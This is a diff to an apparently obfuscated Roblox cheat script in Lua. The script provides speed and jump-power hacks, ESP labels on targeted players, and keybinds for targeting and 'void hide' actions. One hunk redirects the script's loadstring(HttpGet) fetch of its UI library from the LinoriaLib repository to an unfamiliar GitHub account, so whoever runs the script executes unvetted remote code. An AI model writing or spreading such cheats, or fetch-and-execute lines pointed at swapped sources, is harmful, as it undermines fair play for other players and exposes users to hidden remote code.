@@ -338,7 +338,7 @@ end)
 
 wait(1)
 
-local _47 = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
+local _47 = 'https://raw.githubusercontent.com/imcomingforyou6959-gif/UR4/main/'
 local _48 = loadstring(game:HttpGet(_47 .. 'Library.lua'))()
 local _49 = loadstring(game:HttpGet(_47 .. 'addons/ThemeManager.lua'))()
 local _50 = loadstring(game:HttpGet(_47 .. 'addons/SaveManager.lua'))()
@@ -5074,8 +5074,7 @@ Options.WalkSpeed:OnChanged(_WalkSpeedChanged)
 Toggles.WalkSpeedEnabled:OnChanged(_WalkSpeedChanged)
 task.spawn(_WalkSpeedChanged)
 
-_Jumpnorm = 50
-_JPCached = false
+_njp = 50
 
 local function _JumpPowerLoop()
     if not Toggles.JumpPowerEnabled.Value then 
@@ -5098,19 +5097,15 @@ local function _JumpPowerChanged()
     end
     local char = _56.Character
     local hum = char and char:FindFirstChildOfClass("Humanoid")
-    
     if Toggles.JumpPowerEnabled.Value then
-        if hum and not _JPCached then
-            _Jumpnorm = hum.JumpPower
-            _JPCached = true
-        end
-        
         _JPConnection = _52.RenderStepped:Connect(_JumpPowerLoop)
+        if hum then
+            hum.JumpPower = Options.JumpPower.Value
+        end
     else
         if hum then
-            hum.JumpPower = _Jumpnorm
+            hum.JumpPower = _njp
         end
-        _JPCached = false
     end
 end
 
@@ -5120,14 +5115,6 @@ task.spawn(_JumpPowerChanged)
 
 _56.CharacterAdded:Connect(function()
     task.wait(0.5)
-    _JPCached = false
-    if Toggles.JumpPowerEnabled.Value then
-        local hum = _56.Character:FindFirstChildOfClass("Humanoid")
-        if hum then
-            _Jumpnorm = hum.JumpPower
-            _JPCached = true
-        end
-    end
     _JumpPowerChanged()
 end)
 
@@ -7149,12 +7136,33 @@ end)
 
 local function _216(input, processed)
     if processed then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton3 and _104.keybind:upper() == "MB3" then
+        _197()
+        return
+    end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 and _104.keybind:upper() == "MB1" then
+        _197()
+        return
+    end
+    if input.UserInputType == Enum.UserInputType.MouseButton2 and _104.keybind:upper() == "MB2" then
+        _197()
+        return
+    end
     if input.KeyCode == Enum.KeyCode[_104.keybind:upper()] then
         _197()
     else
         local _217 = Options.VoidHideKeybind.Value
-        if _217 and input.KeyCode == _217 then
-            _147()
+        if _217 then
+            local voidStr = tostring(_217):upper()
+            if input.UserInputType == Enum.UserInputType.MouseButton1 and voidStr == "MB1" then
+                _147()
+            elseif input.UserInputType == Enum.UserInputType.MouseButton2 and voidStr == "MB2" then
+                _147()
+            elseif input.UserInputType == Enum.UserInputType.MouseButton3 and voidStr == "MB3" then
+                _147()
+            elseif input.KeyCode == _217 then
+                _147()
+            end
         end
     end
 end
@@ -7781,7 +7789,7 @@ function updateLabelStyle(label, player)
     local displayName = player.DisplayName or player.Name
     if isTargeted then
         label.Text = buildESPText(player, " " .. displayName .. " ")
-        label.TextColor3 = Color3.fromRGB(102, 0, 0)
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
         label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
         label.TextStrokeTransparency = 0
         label.TextSize = 14
@@ -8651,7 +8659,7 @@ function updateLabel(player)
     local isTarget = _104 and _104.targetplayer == player
     
     if isTarget then
-        label.TextColor3 = Color3.fromRGB(255, 0, 0)
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
         label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
         label.TextSize = 14
         label.Font = Enum.Font.GothamBold
